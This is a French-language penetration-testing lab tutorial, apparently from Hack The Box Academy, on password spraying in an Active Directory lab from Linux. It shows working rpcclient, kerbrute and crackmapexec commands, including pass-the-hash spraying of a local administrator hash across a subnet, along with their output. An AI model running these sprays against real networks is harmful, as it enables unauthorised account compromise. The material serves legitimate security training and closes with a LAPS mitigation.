Pulvérisation de mot de passe interne - à partir de Linux
=========================================================

* * * * *

Maintenant que nous avons créé une liste de mots en utilisant l'une des méthodes décrites dans les sections précédentes, il est temps d'exécuter notre attaque. Les sections suivantes nous permettront de pratiquer la pulvérisation de mots de passe à partir d'hôtes Linux et Windows. Il s'agit d'un objectif clé pour nous car il s'agit de l'un des deux principaux moyens d'obtenir des informations d'identification de domaine pour l'accès, mais nous devons également procéder avec prudence.

* * * * *

Pulvérisation de mot de passe interne à partir d'un hôte Linux
--------------------------------------------------------------

Une fois que nous avons créé une liste de mots en utilisant l'une des méthodes présentées dans la section précédente, il est temps d'exécuter l'attaque. `Rpcclient`est une excellente option pour effectuer cette attaque depuis Linux. Une considération importante est qu'une connexion valide n'est pas immédiatement apparente avec `rpcclient`, la réponse `Authority Name`indiquant une connexion réussie. Nous pouvons filtrer les tentatives de connexion invalides par `grepping`for `Authority`dans la réponse. Le one-liner Bash suivant (adapté de [here](https://www.blackhillsinfosec.com/password-spraying-other-fun-with-rpcclient/) ) peut être utilisé pour effectuer l'attaque.

#### Utiliser un one-liner Bash pour l'attaque

  Utiliser un one-liner Bash pour l'attaque

```
for u in $(cat valid_users.txt);do rpcclient -U "$u%Welcome1" -c "getusername;quit" 172.16.5.5 | grep Authority; done

```

Essayons cela dans l'environnement cible.

  Utiliser un one-liner Bash pour l'attaque

```
dsgsec@htb[/htb]$ for u in $(cat valid_users.txt);do rpcclient -U "$u%Welcome1" -c "getusername;quit" 172.16.5.5 | grep Authority; done

Account Name: tjohnson, Authority Name: INLANEFREIGHT
Account Name: sgage, Authority Name: INLANEFREIGHT

```

Nous pouvons également utiliser `Kerbrute`pour la même attaque comme discuté précédemment.

#### Utilisation de Kerbrute pour l'attaque

  Utilisation de Kerbrute pour l'attaque

```
dsgsec@htb[/htb]$ kerbrute passwordspray -d inlanefreight.local --dc 172.16.5.5 valid_users.txt  Welcome1

    __             __               __
   / /_____  _____/ /_  _______  __/ /____
  / //_/ _ \/ ___/ __ \/ ___/ / / / __/ _\
 / ,< /  __/ /  / /_/ / /  / /_/ / /_/  __/
/_/|_|\___/_/  /_.___/_/   \__,_/\__/\___/

Version: dev (9cfb81e) - 02/17/22 - Ronnie Flathers @ropnop

2022/02/17 22:57:12 >  Using KDC(s):
2022/02/17 22:57:12 >  	172.16.5.5:88

2022/02/17 22:57:12 >  [+] VALID LOGIN:	 sgage@inlanefreight.local:Welcome1
2022/02/17 22:57:12 >  Done! Tested 57 logins (1 successes) in 0.172 seconds

```

Il existe plusieurs autres méthodes pour effectuer la pulvérisation de mot de passe à partir de Linux. Une autre excellente option consiste à utiliser `CrackMapExec`. L'outil toujours polyvalent accepte un fichier texte de noms d'utilisateur à exécuter avec un seul mot de passe lors d'une attaque par pulvérisation. Ici, nous cherchons à `+`filtrer les échecs de connexion et à nous concentrer uniquement sur les tentatives de connexion valides pour nous assurer de ne rien manquer en faisant défiler de nombreuses lignes de sortie.

#### Utilisation de CrackMapExec et filtrage des échecs de connexion

  Utilisation de CrackMapExec et filtrage des échecs de connexion

```
dsgsec@htb[/htb]$ sudo crackmapexec smb 172.16.5.5 -u valid_users.txt -p Password123 | grep +

SMB         172.16.5.5      445    ACADEMY-EA-DC01  [+] INLANEFREIGHT.LOCAL\avazquez:Password123

```

Après avoir obtenu un (ou plusieurs !) succès avec notre attaque par pulvérisation de mot de passe, nous pouvons ensuite utiliser `CrackMapExec`pour valider rapidement les informations d'identification par rapport à un contrôleur de domaine.

#### Validation des informations d'identification avec CrackMapExec

  Validation des informations d'identification avec CrackMapExec

```
dsgsec@htb[/htb]$ sudo crackmapexec smb 172.16.5.5 -u avazquez -p Password123

SMB         172.16.5.5      445    ACADEMY-EA-DC01  [*] Windows 10.0 Build 17763 x64 (name:ACADEMY-EA-DC01) (domain:INLANEFREIGHT.LOCAL) (signing:True) (SMBv1:False)
SMB         172.16.5.5      445    ACADEMY-EA-DC01  [+] INLANEFREIGHT.LOCAL\avazquez:Password123

```

* * * * *

Réutilisation du mot de passe de l'administrateur local
-------------------------------------------------------

La pulvérisation de mot de passe interne n'est pas seulement possible avec les comptes d'utilisateurs de domaine. Si vous obtenez un accès administratif et le hachage du mot de passe NTLM ou le mot de passe en texte clair pour le compte administrateur local (ou un autre compte local privilégié), cela peut être tenté sur plusieurs hôtes du réseau. La réutilisation du mot de passe du compte administrateur local est répandue en raison de l'utilisation d'images Gold dans les déploiements automatisés et de la facilité de gestion perçue en appliquant le même mot de passe sur plusieurs hôtes.

CrackMapExec est un outil pratique pour tenter cette attaque. Il vaut la peine de cibler les hôtes de grande valeur tels que les serveurs `SQL`ou `Microsoft Exchange`, car ils sont plus susceptibles d'avoir un utilisateur hautement privilégié connecté ou d'avoir leurs informations d'identification persistantes en mémoire.

Lorsque vous travaillez avec des comptes d'administrateur locaux, une considération est la réutilisation des mots de passe ou les formats de mots de passe communs à tous les comptes. Si nous trouvons un hôte de bureau avec le mot de passe du compte administrateur local défini sur quelque chose d'unique tel que `$desktop%@admin123`, cela peut valoir la peine d'essayer `$server%@admin123`contre les serveurs. De plus, si nous trouvons des comptes d'administrateur local non standard tels que `bsmith`, nous pouvons constater que le mot de passe est réutilisé pour un compte d'utilisateur de domaine portant le même nom. Le même principe peut s'appliquer aux comptes de domaine. Si nous récupérons le mot de passe d'un utilisateur nommé `ajones`, cela vaut la peine d'essayer le même mot de passe sur son compte administrateur (si l'utilisateur en a un), par exemple,`ajones_adm`, pour voir s'ils réutilisent leurs mots de passe. Ceci est également courant dans les situations d'approbation de domaine. Nous pouvons obtenir des informations d'identification valides pour un utilisateur dans le domaine A qui sont valides pour un utilisateur avec le même nom d'utilisateur ou un nom d'utilisateur similaire dans le domaine B ou vice-versa.

Parfois, nous pouvons uniquement récupérer le hachage NTLM du compte administrateur local à partir de la base de données SAM locale. Dans ces cas, nous pouvons pulvériser le hachage NT sur un sous-réseau entier (ou plusieurs sous-réseaux) pour rechercher des comptes d'administrateur local avec le même jeu de mots de passe. Dans l'exemple ci-dessous, nous tentons de nous authentifier auprès de tous les hôtes d'un réseau /23 à l'aide du hachage NT du compte d'administrateur local intégré récupéré à partir d'une autre machine. L' `--local-auth`indicateur indiquera à l'outil de ne tenter de se connecter qu'une seule fois sur chaque machine, ce qui supprime tout risque de verrouillage de compte. `Make sure this flag is set so we don't potentially lock out the built-in administrator for the domain`. Par défaut, sans l'option d'authentification locale définie, l'outil tentera de s'authentifier à l'aide du domaine actuel, ce qui pourrait rapidement entraîner le verrouillage du compte.

#### Pulvérisation d'administrateur local avec CrackMapExec

  Pulvérisation d'administrateur local avec CrackMapExec

```
dsgsec@htb[/htb]$ sudo crackmapexec smb --local-auth 172.16.5.0/23 -u administrator -H 88ad09182de639ccc6579eb0849751cf | grep +

SMB         172.16.5.50     445    ACADEMY-EA-MX01  [+] ACADEMY-EA-MX01\administrator 88ad09182de639ccc6579eb0849751cf (Pwn3d!)
SMB         172.16.5.25     445    ACADEMY-EA-MS01  [+] ACADEMY-EA-MS01\administrator 88ad09182de639ccc6579eb0849751cf (Pwn3d!)
SMB         172.16.5.125    445    ACADEMY-EA-WEB0  [+] ACADEMY-EA-WEB0\administrator 88ad09182de639ccc6579eb0849751cf (Pwn3d!)

```

La sortie ci-dessus montre que les informations d'identification étaient valides en tant qu'administrateur local sur `3`les systèmes du `172.16.5.0/23`sous-réseau. Nous pourrions ensuite passer à l'énumération de chaque système pour voir si nous pouvons trouver quelque chose qui nous aidera à approfondir notre accès.

Cette technique, bien qu'efficace, est assez bruyante et n'est pas un bon choix pour les évaluations nécessitant de la furtivité. Il vaut toujours la peine de rechercher ce problème lors des tests d'intrusion, même s'il ne fait pas partie de notre chemin pour compromettre le domaine, car il s'agit d'un problème courant et doit être mis en évidence pour nos clients. Une façon de résoudre ce problème consiste à utiliser l'outil gratuit Microsoft [Local Administrator Password Solution (LAPS)](https://www.microsoft.com/en-us/download/details.aspx?id=46899) pour qu'Active Directory gère les mots de passe des administrateurs locaux et applique un mot de passe unique sur chaque hôte qui tourne sur un intervalle défini.
